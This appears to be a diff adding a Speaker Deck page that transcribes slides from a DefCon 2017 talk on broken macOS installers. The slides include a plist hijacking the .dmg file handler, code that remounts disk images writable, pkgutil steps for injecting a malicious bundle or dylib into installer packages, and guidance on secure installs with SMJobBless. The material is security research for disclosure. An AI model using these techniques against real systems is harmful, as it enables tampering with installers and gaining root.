+MAKING ..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! intercepting .dmg mounts to achieve R/W
+MAKING ..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_45.jpg">intercepting .dmg mounts to achieve R/W MAKING TARGETS WRITABLE write-only</a>
+            </h3>
+            (/Volumes) .dmg $ less ~/Library/Preferences/com.apple.LaunchServices/com.apple.launchservices.secure.plist &lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; &lt;plist version=&quot;1.0&quot;&gt; &lt;dict&gt; &lt;key&gt;LSHandlers&lt;/key&gt; &lt;array&gt; &lt;dict&gt; &lt;key&gt;LSHandlerContentType&lt;/key&gt; &lt;string&gt;com.apple.disk-image-udif&lt;/string&gt; &lt;key&gt;LSHandlerPreferredVersions&lt;/key&gt; &lt;dict&gt; &lt;key&gt;LSHandlerRoleAll&lt;/key&gt; &lt;string&gt;-&lt;/string&gt; &lt;/dict&gt; &lt;key&gt;LSHandlerRoleAll&lt;/key&gt; &lt;string&gt;com.company.evilHijacker&lt;/string&gt; &lt;/dict&gt; &lt;/array&gt; &lt;/dict&gt; &lt;/plist&gt; com.apple.launchservices.secure.plist -(BOOL)application:(NSApplication *)sender openFile:(NSString *)filename { //mount .dmg as R/W! NSTask *task = [[NSTask alloc] init]; task.launchPath = @&quot;/usr/bin/hdiutil&quot;; task.arguments = @[@&quot;attach&quot;, filename, @&quot;-shadow&quot;, @&quot;-noverify&quot;]; [task launch]; [task waitUntilExit]; //open in Finder.app [[NSWorkspace sharedWorkspace] openFile:@&quot;/Volumes/&lt;mount point&gt;/&quot;]; return YES; } .dmg writable :) default handler
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="vmware installer/updater
+EXPLOIT:
+" title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! vmware installer/updater
+EXPLOIT:
+" href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_46.jpg">vmware installer/updater EXPLOIT:</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="google chrome
+EXPLOIT:
+" title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! google chrome
+EXPLOIT:
+" href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_47.jpg">google chrome EXPLOIT:</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="&#39;s Installer
+EXPLOIT:
+1
+2
+3
+expand pkg
+$ pkguti..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! &amp;#39;s Installer
+EXPLOIT:
+1
+2
+3
+expand pkg
+$ pkguti..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_48.jpg">&#39;s Installer EXPLOIT: 1 2 3 expand pkg $ pkgutil</a>
+            </h3>
+            --expand cp evil.bundle installMe/Plugins flatten pkg &amp; replace $ pkgutil --flatten system popup from within Installer.app } fake popup piggy-back off legit one or response: *crickets* :( malicious dylib in Installer.app
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="CONCLUSIONS
+wrapping this up
+" title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! CONCLUSIONS
+wrapping this up
+" href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_49.jpg">CONCLUSIONS wrapping this up</a>
+            </h3>
+            
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="scare me! Why?
+AUTHENTICATION DIALOGUES
+1
+2
+3
+t..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! scare me! Why?
+AUTHENTICATION DIALOGUES
+1
+2
+3
+t..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_50.jpg">scare me! Why? AUTHENTICATION DIALOGUES 1 2 3 trivial to</a>
+            </h3>
+            spoof invoked via insecure APIs trusted/privileged code often insecure }on my box :/ #_ end result :(
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="stop being so lame!
+MALWARE AUTHORS
+infect
+troj..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! stop being so lame!
+MALWARE AUTHORS
+infect
+troj..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_51.jpg">stop being so lame! MALWARE AUTHORS infect trojan email exploits</a>
+            </h3>
+            } 1 watch &amp; wait 2 or so many targets! any .pkg? exploit 3 #_ r00t! 4
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="...use SMJobBless!
+(MORE)SECURE INSTALLS
+&quot;SMJob..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! ...use SMJobBless!
+(MORE)SECURE INSTALLS
+&amp;quot;SMJob..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_52.jpg">...use SMJobBless! (MORE)SECURE INSTALLS &quot;SMJobBless()&quot; &lt;key&gt;SMPrivilegedExecutables&lt;/key&gt; &lt;dict&gt; &lt;key&gt;com.company.HelperTool&lt;/key&gt; &lt;string&gt;identifier &quot;com.company.HelperTool&quot;</a>
+            </h3>
+            and (certificate leaf[field. 1.2.840.113635.100.6.1.9] .... and certificate leaf[subject.OU] = &lt;teamIdentifier&gt;) &lt;/string&gt; &lt;/dict&gt; Contents/Library/LaunchServices/ helper tool app&#39;s Info.plist service management daemon (smd) helper tool /private/var/run/com.apple.xpc.smd/ PrivilegedHelperToolStaging helper tool /Library/PrivilegedHelperTools launchd plist /Library/LaunchDaemons } as root verified } verifies &#39;secure&#39; 2 3 1 4
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="...use SMJobBless!
+(MORE)SECURE INSTALLS
+Author..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! ...use SMJobBless!
+(MORE)SECURE INSTALLS
+Author..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_53.jpg">...use SMJobBless! (MORE)SECURE INSTALLS AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &amp;self-&gt;authRef); AuthorizationItem authItem</a>
+            </h3>
+            = { kSMRightBlessPrivilegedHelper, 0, NULL, 0 }; AuthorizationRights authRights = { 1, &amp;authItem }; AuthorizationFlags flags = kAuthorizationFlagDefaults | kAuthorizationFlagInteractionAllowed | kAuthorizationFlagPreAuthorize | kAuthorizationFlagExtendRights; AuthorizationCopyRights(self-&gt;authRef, &amp;authRights, kAuthorizationEmptyEnvironment, flags, NULL); /* This does all the work of verifying the helper tool against the application * and vice-versa. Once verification has passed, the embedded launchd.plist * is extracted and placed in /Library/LaunchDaemons and then loaded. The * executable is placed in /Library/PrivilegedHelperTools. */ SMJobBless(kSMDomainSystemLaunchd, (CFStringRef)@&quot;com.someCompany.HelperToolBundleID&quot;, self-&gt;authRef, &amp;error); apple&#39;s &quot;SMJobBless.zip&quot; } ...but &quot;The calling application &amp; target executable tool must both be signed&quot; -apple persistently installs a launch daemon (that must delete itself!) &quot;You cannot specify your own program arguments&quot; -apple (implement XPC) SMJobBless() in code #unload helper tool&#39;s launch daemon sudo launchctl unload /Library/LaunchDaemons/ com.company.HelperTool.plist #delete helper tool&#39;s launch daemon plist sudo rm /Library/LaunchDaemons/ com.company.HelperTool.plist #delete helper tool binary sudo rm /Library/PrivilegedHelperTools/HelperTool uninstall logic
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="free security tools!
+OBJECTIVE-SEE(.COM)
+KnockK..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! free security tools!
+OBJECTIVE-SEE(.COM)
+KnockK..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_54.jpg">free security tools! OBJECTIVE-SEE(.COM) KnockKnock BlockBlock TaskExplorer Ostiarius Hijack Scanner</a>
+            </h3>
+            KextViewr RansomWhere? support it :) www.patreon.com/objective_see
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="contact me any time :)
+QUESTIONS &amp; ANSWERS
+@pat..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! contact me any time :)
+QUESTIONS &amp;amp; ANSWERS
+@pat..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_55.jpg">contact me any time :) QUESTIONS &amp; ANSWERS @patrickwardle patrick@synack.com</a>
+            </h3>
+            www.synack.com/red-team join the red team! patreon.com/objective_see speakerdeck.com/patrickwardle
+        </li>
+        <li class="mb-2">
+            <h3>
+              <a alt="mahalo :)
+CREDITS
+- FLATICON.COM
+- ICONMONSTR.C..." title="[DefCon 2017] Death by 1000 Installers; it&#39;s All Broken! mahalo :)
+CREDITS
+- FLATICON.COM
+- ICONMONSTR.C..." href="https://files.speakerdeck.com/presentations/6bd02a9ee4e744908e24c72945ac3bba/slide_56.jpg">mahalo :) CREDITS - FLATICON.COM - ICONMONSTR.COM - ICONEXPERIENCE.COM -</a>
+            </h3>
+            HTTP://WIRDOU.COM/2012/02/04/IS-THAT-BAD-DOCTOR/ - HTTP://TH07.DEVIANTART.NET/FS70/PRE/F/ 2010/206/4/4/441488BCC359B59BE409CA02F863E843.JPG     - &quot;AUTHORIZATION SERVICES PROGRAMMING GUIDE&quot; APPLE - *OS INTERNALS V.III&quot; J. LEVIN - &quot;OSX FSEVENTS&quot; HTTPS://STACKOVERFLOW.COM/A/20854586/3854841 - &quot;APPS USING SPARKLE&quot; HTTPS://GITHUB.COM/SPARKLE-PROJECT/SPARKLE/ISSUES/717 - &quot;REMOVE USES OF DEPRECATED FUNCTION AUTHORIZATIONEXECUTEWITHPRIVILEGES&quot; HTTPS:// BUGS.CHROMIUM.ORG/P/CHROMIUM/ISSUES/DETAIL?ID=593133 images resources
+        </li>
+    </ol>
+  </div>
+
+    </div>
+
+    <footer class="d-block border-top">
+  <div class="container py-3 py-md-5 text-muted">
+    <div class="row text-center text-md-left">
+      <div class="col-12 col-md-auto mr-auto mb-3 mb-md-0">
+        <div class="copyright-text mb-3 mb-md-0">Copyright &copy; 2021 Speaker Deck, LLC.</div>
+        <div>All slide content and descriptions are owned by their&nbsp;creators.</div>
+      </div>
+      <div class="col-12 col-md-auto">
+        <a href="/faq">F.A.Q.</a> &nbsp;
+        <a href="/tos">Terms</a> &nbsp;
+        <a href="/privacy">Privacy</a> &nbsp;
+        <a href="/dmca">DMCA</a>
+      </div>
+    </div>
+  </div>
+</footer>
+
+      <script src="https://d1eu30co0ohy4w.cloudfront.net/assets/stats-a5a5af083780742e6a1a.js"></script>
+  <script data-turbolinks-eval="false">
+    Stats.host = 'speakerdeck.com';
+  </script>
+
+    <script type="text/javascript">
+      var _gaq = _gaq || [];
+      _gaq.push(['_setAccount', 'UA-19290517-1']);
+      _gaq.push(['_setDomainName', '.speakerdeck.com']);
+      _gaq.push(['_trackPageview']);
+
+      (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+      })();
+    </script>
+
+
+    <script>
+      !function(f,b,e,v,n,t,s) {
+        if(f.fbq) return;
+        n=f.fbq=function() { n.callMethod? n.callMethod.apply(n,arguments) : n.queue.push(arguments) };
+        if(!f._fbq) f._fbq=n; n.push=n; n.loaded=!0; n.version='2.0'; n.queue=[];
+        t=b.createElement(e); t.async=!0; t.src=v;
+        s=b.getElementsByTagName(e)[0];
+        s.parentNode.insertBefore(t, s)
+      }(window, document,'script', 'https://connect.facebook.net/en_US/fbevents.js');
+
+      fbq('init', '2893765844191276');
+      fbq('track', 'PageView');
+
+    </script>
+    <noscript>
+      <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2893765844191276&ev=PageView&noscript=1" />
+    </noscript>
+
+    <script type="text/javascript" src="https://platform.twitter.com/widgets.js"></script>
+<script>
+  window.fbAsyncInit = function() {
+    FB.init({
+      appId            : '491686710857561',
+      autoLogAppEvents : true,
+      xfbml            : true,
+      version          : 'v2.12'
+    });
+  };
+
+  (function(d, s, id){
+     var js, fjs = d.getElementsByTagName(s)[0];
+     if (d.getElementById(id)) {return;}
+     js = d.createElement(s); js.id = id;
+     js.src = "https://connect.facebook.net/en_US/sdk.js";
+     fjs.parentNode.insertBefore(js, fjs);
+   }(document, 'script', 'facebook-jssdk'));
+</script>
+
+  </body>
+</html>
